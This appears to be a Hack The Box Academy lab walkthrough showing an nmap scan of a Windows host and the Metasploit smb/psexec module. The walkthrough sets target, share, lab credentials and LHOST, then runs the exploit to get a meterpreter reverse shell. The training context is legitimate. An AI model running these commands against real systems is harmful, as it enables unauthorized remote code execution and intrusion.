### Let's take this Nmap scan:
```shell
nmap -sC -sV -Pn 10.129.164.25

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-09T21:03:31
|_  start_date: N/A
```

#### Searching Within Metasploit
```shell-session
msf6 > search smb

Matching Modules
================
...
...
...
56   exploit/windows/smb/psexec
...
...
```
Let's look at one module, in particular, to understand it within the context of payloads.
-> `56 exploit/windows/smb/psexec`

|Output|Meaning|
|---|---|
|`56`|The number assigned to the module in the table within the context of the search. This number makes it easier to select. We can use the command `use 56` to select the module.|
|`exploit/`|This defines the type of module. In this case, this is an exploit module. Many exploit modules in MSF include the payload that attempts to establish a shell session.|
|`windows/`|This defines the platform we are targeting. In this case, we know the target is Windows, so the exploit and payload will be for Windows.|
|`smb/`|This defines the service for which the payload in the module is written.|
|`psexec`|This defines the tool that will get uploaded to the target system if it is vulnerable.|

#### Option Selection
```shell
msf6 > use 56
```

#### Examining an Exploit's Options
```shell-session
msf6 exploit(windows/smb/psexec) > options
msf6 exploit(windows/smb/psexec) > show options
```

#### Setting Options
```shell
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SMBSHARE ADMIN$
SMBSHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```
These settings will ensure that our payload is delivered to the proper target (`RHOSTS`), uploaded to the default administrative share (`ADMIN$`) utilizing credentials (`SMBPass` & `SMBUser`), then initiate a reverse shell connection with our local host machine (`LHOST`).

#### Exploits Away
```shell
msf6 exploit(windows/smb/psexec) > exploit

meterpreter >
```

#### Interactive Shell
```shell
meterpreter > shell
Process 604 created.

### Questions

Just need to exploit the server with given credentials and psexec module of Metasploit. Like above.
